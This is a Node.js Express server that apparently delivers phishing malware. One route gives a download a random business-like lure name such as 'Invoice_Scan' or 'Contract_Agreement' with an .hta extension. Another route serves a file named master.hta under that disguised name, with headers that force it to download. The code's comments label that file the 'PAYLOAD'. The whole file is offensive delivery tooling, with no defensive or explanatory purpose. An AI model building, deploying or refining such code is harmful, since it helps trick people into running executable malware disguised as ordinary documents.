const express = require('express');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3000;

// Log public folder contents ONCE at startup for debugging
const publicDir = path.join(__dirname, 'public');
console.log('[STARTUP] __dirname:', __dirname);
console.log('[STARTUP] publicDir:', publicDir);
if (fs.existsSync(publicDir)) {
    console.log('[STARTUP] public/ contents:', fs.readdirSync(publicDir));
} else {
    console.error('[STARTUP] ERROR: public/ directory does not exist!');
}

// BRIDGE - Generates unique .hta filename and redirects
app.get('/bridge', (req, res) => {
    const randomId = crypto.randomInt(100000, 999999);
    const themes = ['Adobe_Document', 'Contract_Agreement', 'Invoice_Scan', 'Policy_Update', 'Secure_Form'];
    const theme = themes[Math.floor(Math.random() * themes.length)];
    const uniqueName = `${theme}_${randomId}.hta`;
    
    console.log(`[BRIDGE] Generated: ${uniqueName}`);
    res.redirect(`/confirm.html?file=${encodeURIComponent(uniqueName)}`);
});

// PAYLOAD - Serves master.hta AS THE UNIQUE NAME FROM URL
app.get('/payload/:filename', (req, res) => {
    // ✅ FIXED PATH: Points to payload subfolder where master.hta actually lives
    const filePath = path.resolve(path.join(__dirname, 'public', 'payload', 'master.hta'));
    
    console.log('[PAYLOAD] Requested:', req.params.filename);
    console.log('[PAYLOAD] Resolved path:', filePath);
    console.log('[PAYLOAD] File exists:', fs.existsSync(filePath));
    
    // List files in public/payload/ on EVERY request to catch issues
    try {
        const payloadDir = path.join(__dirname, 'public', 'payload');
        if (fs.existsSync(payloadDir)) {
            console.log('[PAYLOAD] payload/ contents:', fs.readdirSync(payloadDir));
        } else {
            console.error('[PAYLOAD] payload/ directory missing!');
        }
    } catch(e) {
        console.error('[PAYLOAD] Cannot read payload/ dir:', e.message);
    }
    
    if (!fs.existsSync(filePath)) {
        return res.status(404).json({ 
            error: 'master.hta not found', 
            lookedAt: filePath,
            publicContents: fs.existsSync(publicDir) ? fs.readdirSync(publicDir) : 'DIR_MISSING'
        });
    }

    // Serve with EXACT requested filename as .hta
    res.setHeader('Content-Disposition', `attachment; filename="${req.params.filename}"`);
    res.setHeader('Content-Type', 'application/hta');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    
    res.sendFile(filePath, (err) => {
        if (err) {
            console.error(`[PAYLOAD] Send failed: ${err.message}`);
            if (!res.headersSent) res.status(500).send('Download error.');
        } else {
            console.log(`[PAYLOAD] SUCCESS: Sent as "${req.params.filename}"`);
        }
    });
});

// Serve HTML files explicitly (NO blanket static middleware)
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/confirm.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'confirm.html')));

app.get('/health', (req, res) => res.json({ status: 'ok' }));

app.listen(port, () => console.log(`✅ Running on port ${port}`));
